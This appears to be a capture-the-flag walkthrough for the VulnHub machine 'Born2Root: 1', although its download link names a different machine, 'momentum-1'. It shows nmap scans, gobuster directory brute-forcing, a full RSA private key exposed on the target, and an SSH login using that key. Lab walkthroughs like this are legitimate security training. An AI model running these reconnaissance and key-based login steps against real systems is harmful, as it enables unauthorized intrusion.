<div class="page">

# Born2Root: 1

\

## 

## Born2Root: 1

- **<span style="color:#237522;">Born2Root: 1</span>** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/momentum-1,685/>

![](images/1-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  <span style="color:#9141ac;">Network Scanning</span> :

- Find the machine IP :

<div class="codebox">

    nmap -sn 192.168.2.0/24

</div>

![](images/1-2.png)

- Run nmap master command :

<div class="codebox">

    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.123

</div>

![](images/1-3.png)

- Find available port in the machine ( Optional ) :

<div class="codebox">

    nmap -v -p- 192.168.2.123

</div>

- 

<div class="codebox">

    nmap -sC -sV -A 192.168.2.123 

</div>

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

<div class="codebox">

    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.123

</div>

![](images/1-4.png)

1.  <span style="color:#9141ac;">Web Enumeration</span> :

- IP visit in browser : <http://192.168.2.123>

![](images/1-5.png)

- Found the Username :

<div class="codebox">

    Martin N
    Hadi M
    Jimmy S

</div>

- Directory brute force to find the endpoints

<div class="codebox">

    gobuster dir -u http://192.168.2.123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,zip -t 50

</div>

![](images/1-6.png)

- Visit the endpoints : <http://192.168.2.123/robots.txt>
  <http://192.168.2.123/files/> <http://192.168.2.123/wordpress-blog/>
  <http://192.168.2.123/icons/>

<!-- -->

- In /icons endpoints we found the text file :

![](images/1-7.png)

- Visit the file : <http://192.168.2.123/icons/VDSoyuAXiO.txt>

![](images/1-8.png) Found the rsa_key .

3\. <span style="color:#9141ac;">SSH Access</span> :

- Make a file :

<div class="codebox">

    nano id_rsa

</div>

- Enter the rsa key :

<div class="codebox">

    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC
    tprVUPb+fmkKvOf5ntACY7c/5fM4y83+UWPG0l90WrjdaTCPaGAHjEpZYKt0lEc0
    FiQkXTvJS4faYHNah/mEvhldgTc59jeX4di0f660mJjF31SA9UgMLQReKd5GKtUx
    5m+sQq6L+VyA2/6GD/T3qx35AT4argdk1NZ9ONmj1ZcIp0evVJvUul34zuJZ5mDv
    DZuLRR6QpcMLJRGEFZ4qwkMZn7NavEmfX1Yka6mu9iwxkY6iT45YA1C4p7NEi5yI
    /P6kDxMfCVELAUaU8fcPolkZ6xLdS6yyThZHHwIDAQABAoIBAAZ+clCTTA/E3n7E
    LL/SvH3oGQd16xh9O2FyR4YIQMWQKwb7/OgOfEpWjpPf/dT+sK9eypnoDiZkmYhw
    +rGii6Z2wCXhjN7wXPnj1qotXkpu4bgS3+F8+BLjlQ79ny2Busf+pQNf1syexDJS
    sEkoDLGTBiubD3Ii4UoF7KfsozihdmQY5qud2c4iE0ioayo2m9XIDreJEB20Q5Ta
    lV0G03unv/v7OK3g8dAQHrBR9MXuYiorcwxLAe+Gm1h4XanMKDYM5/jW4JO2ITAn
    kPducC9chbM4NqB3ryNCD4YEgx8zWGDt0wjgyfnsF4fiYEI6tqAwWoB0tdqJFXAy
    FlQJfYECgYEAz1bFCpGBCApF1k/oaQAyy5tir5NQpttCc0L2U1kiJWNmJSHk/tTX
    4+ly0CBUzDkkedY1tVYK7TuH7/tOjh8M1BLa+g+Csb/OWLuMKmpoqyaejmoKkLnB
    WVGkcdIulfsW7DWVMS/zA8ixJpt7bvY7Y142gkurxqjLMz5s/xT9geECgYEAxpfC
    fGvogWRYUY07OLE/b7oMVOdBQsmlnaKVybuKf3RjeCYhbiRSzKz05NM/1Cqf359l
    Wdznq4fkIvr6khliuj8GuCwv6wKn9+nViS18s1bG6Z5UJYSRJRpviCS+9BGShG1s
    KOf1fAWNwRcn1UKtdQVvaLBX9kIwcmTBrl+e6P8CgYAtz24Zt6xaqmpjv6QKDxEq
    C1rykAnx0+AKt3DVWYxB1oRrD+IYq85HfPzxHzOdK8LzaHDVb/1aDR0r2MqyfAnJ
    kaDwPx0RSN++mzGM7ZXSuuWtcaCD+YbOxUsgGuBQIvodlnkwNPfsjhsV/KR5D85v
    VhGVGEML0Z+T4ucSNQEOAQKBgQCHedfvUR3Xx0CIwbP4xNHlwiHPecMHcNBObS+J
    4ypkMF37BOghXx4tCoA16fbNIhbWUsKtPwm79oQnaNeu+ypiq8RFt78orzMu6JIH
    dsRvA2/Gx3/X6Eur6BDV61to3OP6+zqh3TuWU6OUadt+nHIANqj93e7jy9uI7jtC
    XXDmuQKBgHZAE6GTq47k4sbFbWqldS79yhjjLloj0VUhValZyAP6XV8JTiAg9CYR
    2o1pyGm7j7wfhIZNBP/wwJSC2/NLV6rQeH7Zj8nFv69RcRX56LrQZjFAWWsa/C43
    rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+
    -----END RSA PRIVATE KEY-----

</div>

- Get the permissions :

<div class="codebox">

    chmod 600 id_rsa

</div>

![](images/1-9.png)

- Run the ssh command :

<div class="codebox">

    ssh -i id_rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa martin@192.168.2.123

</div>

![](images/1-10.png)

</div>
